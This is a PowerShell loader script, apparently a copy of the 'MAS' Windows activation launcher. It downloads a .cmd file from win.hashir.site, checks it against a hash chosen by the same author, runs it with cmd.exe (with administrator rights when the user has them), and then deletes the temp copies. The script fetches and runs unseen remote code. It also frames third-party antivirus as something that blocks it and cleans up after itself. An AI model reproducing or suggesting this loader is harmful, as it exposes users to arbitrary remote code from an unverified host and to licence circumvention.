$troubleshoot = 'https://win.hashir.site/help'

if ($ExecutionContext.SessionState.LanguageMode.value__ -ne 0) {
    Write-Host "PowerShell is not running in Full Language Mode."
    Write-Host "Help - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
    return
}

function Check3rdAV {
    $avList = Get-CimInstance -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Where-Object { $_.displayName -notlike '*windows*' } | Select-Object -ExpandProperty displayName
    if ($avList) {
        Write-Host '3rd party Antivirus might be blocking the script - ' -ForegroundColor White -BackgroundColor Blue -NoNewline
        Write-Host " $($avList -join ', ')" -ForegroundColor DarkRed -BackgroundColor White
    }
}

function CheckFile { 
    param ([string]$FilePath) 
    if (-not (Test-Path $FilePath)) { 
        Check3rdAV
        Write-Host "Failed to create MAS file in temp folder, aborting!"
        Write-Host "Help - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
        throw 
    } 
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$URLs = @(
    'https://win.hashir.site/MAS_AIO.cmd'
)

foreach ($URL in $URLs | Sort-Object { Get-Random }) {
    try { $response = Invoke-WebRequest -Uri $URL -UseBasicParsing; break } catch {}
}

if (-not $response) {
    Check3rdAV
    Write-Host "Failed to retrieve MAS from the site, aborting!"
    Write-Host "Help - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
    return
}

# ✅ Verified SHA256 hash
$releaseHash = '03F7FFE191B605E40FB0387B208F1A245474E2DAE99361ACACD71A250F2285EC'

$stream = New-Object IO.MemoryStream
$writer = New-Object IO.StreamWriter $stream
$writer.Write($response)
$writer.Flush()
$stream.Position = 0
$hash = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($stream)) -replace '-'
if ($hash -ne $releaseHash) {
    Write-Warning "Hash ($hash) mismatch, aborting!`nCheck $troubleshoot"
    $response = $null
    return
}

$paths = "HKCU:\SOFTWARE\Microsoft\Command Processor", "HKLM:\SOFTWARE\Microsoft\Command Processor"
foreach ($path in $paths) { 
    if (Get-ItemProperty -Path $path -Name "Autorun" -ErrorAction SilentlyContinue) { 
        Write-Warning "Autorun registry found, CMD may crash! Use:`nRemove-ItemProperty -Path '$path' -Name 'Autorun'"
    } 
}

$rand = [Guid]::NewGuid().Guid
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:USERPROFILE\AppData\Local\Temp\MAS_$rand.cmd" }
Set-Content -Path $FilePath -Value "@::: $rand `r`n$response"
CheckFile $FilePath

$env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
$chkcmd = & $env:ComSpec /c "echo CMD is working"
if ($chkcmd -notcontains "CMD is working") {
    Write-Warning "cmd.exe is not working.`nVisit $troubleshoot"
}
Start-Process -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath"" $args""" -Wait
CheckFile $FilePath

$FilePaths = @("$env:SystemRoot\Temp\MAS*.cmd", "$env:USERPROFILE\AppData\Local\Temp\MAS*.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
